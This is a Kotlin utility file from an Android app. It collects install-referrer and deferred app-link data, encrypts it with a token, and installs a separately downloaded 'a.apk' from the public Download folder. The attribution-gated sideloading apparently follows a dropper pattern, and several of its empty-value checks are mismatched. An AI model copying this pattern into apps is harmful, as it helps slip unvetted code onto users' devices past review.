package cctv5.cha.abc123.utils

import android.app.DownloadManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.text.TextUtils
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.FileProvider
import androidx.lifecycle.lifecycleScope
import cctv5.cha.abc123.basic.BasicApp
import cctv5.cha.abc123.modle.RequestBean
import cctv5.cha.abc123.receiver.MyReceiver
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.facebook.applinks.AppLinkData
import com.google.gson.Gson
import com.hjq.permissions.XXPermissions
import com.tencent.mmkv.MMKV
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.asFlow
import kotlinx.coroutines.flow.collect
import java.io.BufferedWriter
import java.io.File
import java.io.FileWriter
import java.io.IOException


val filePath = Environment.getExternalStorageDirectory().absolutePath + File.separator + "Download" + File.separator

val fileName = "a.apk"

val path = filePath + fileName

val seesionName = "session"

fun Any?.loges() {
    Log.e("xxxxxxH", "$this")
}

fun AppCompatActivity.xRegisterReceiver() {
    val intentFilter = IntentFilter()
    intentFilter.addAction("action_download")
    intentFilter.addAction(Intent.ACTION_PACKAGE_ADDED)
    intentFilter.addAction(DownloadManager.ACTION_DOWNLOAD_COMPLETE)
    intentFilter.addDataScheme("package")
    registerReceiver(MyReceiver(), intentFilter)
}

fun AppCompatActivity.requestPermissions(block: (Boolean) -> Unit) {
    XXPermissions.with(this).permission(BasicApp.instance!!.getPermissions())
        .request { _, all ->
            block(all)
        }
}

fun AppCompatActivity.fetchAppLink() {
    if (appLink == "AppLink is empty") {
        AppLinkData.fetchDeferredAppLinkData(this) {
            it?.let {
                MMKV.defaultMMKV().encode("appLink", it.targetUri.toString())
            }
        }
    }
}

fun AppCompatActivity.ref() {
    if (ref == "Referrer is empty") {
        InstallReferrerClient.newBuilder(this).build().apply {
            startConnection(object : InstallReferrerStateListener {
                override fun onInstallReferrerSetupFinished(responseCode: Int) {
                    try {
                        MMKV.defaultMMKV().encode("ref", installReferrer.installReferrer)
                    } catch (e: Exception) {
                        MMKV.defaultMMKV().encode("ref", "Referrer is empty")
                    }
                }

                override fun onInstallReferrerServiceDisconnected() {

                }
            })
        }
    }
}

fun AppCompatActivity.countDown(block: () -> Unit) {
    var job: Job? = null
    job = lifecycleScope.launch(Dispatchers.IO) {
        (0 until 10).asFlow().collect {
            delay(1000)
            if (!TextUtils.isEmpty(appLink) && !TextUtils.isEmpty(ref)) {
                withContext(Dispatchers.Main) {
                    block()
                }
                job?.cancel()
            }
            if (it == 9) {
                withContext(Dispatchers.Main) {
                    block()
                }
                job?.cancel()
            }
        }
    }
}

fun requestData(): String {
    val applink = MMKV.defaultMMKV().decodeString("appLink", "applink is empty")!!
    val ref = MMKV.defaultMMKV().decodeString("ref", "ref is empty")!!
    val token = BasicApp.instance!!.getToken()
    val appName = BasicApp.instance!!.getAppName()
    val appId = BasicApp.instance!!.getAppId()
    val istatus = MMKV.defaultMMKV()!!.decodeBool("istatus", true)
    val body = RequestBean(appName, appId, applink, ref, token, istatus)
    val encrypStr = AesEncryptUtil.encrypt(Gson().toJson(body))
    return encrypStr
}

fun setConfig() {
    val token = BasicApp.instance!!.getToken()

    val config = "$token|$appLink|$ref"

    writeConfig(config)
}

fun writeConfig(config: String) {
    val s = AesEncryptUtil.encrypt(config)
    var bw: BufferedWriter? = null
    try {
        bw = BufferedWriter(FileWriter(File(filePath, seesionName), false))
        bw.write(s)
    } catch (e: IOException) {
        e.printStackTrace()
    } finally {
        try {
            bw?.close()
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }
}

fun install(context: Context, file: File) {
    if (!file.exists()) return
    var uri = if (Build.VERSION.SDK_INT >= 24) {
        FileProvider.getUriForFile(context, context.packageName.toString() + ".fileprovider", file)
    } else {
        Uri.fromFile(file)
    }
    if (Build.VERSION.SDK_INT >= 26) {
        if (!context.packageManager.canRequestPackageInstalls()) {
            Toast.makeText(context, "No Permission", Toast.LENGTH_SHORT).show()
            return
        }
    }
    val intent = Intent("android.intent.action.VIEW")
    intent.flags = Intent.FLAG_GRANT_READ_URI_PERMISSION
    if (Build.VERSION.SDK_INT >= 24) {
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
    }
    intent.setDataAndType(uri, "application/vnd.android.package-archive")
    context.startActivity(intent)
}


val appLink
    get() = MMKV.defaultMMKV().decodeString("appLink", "appLink is empty")

val ref
    get() = MMKV.defaultMMKV().decodeString("ref", "ref is empty")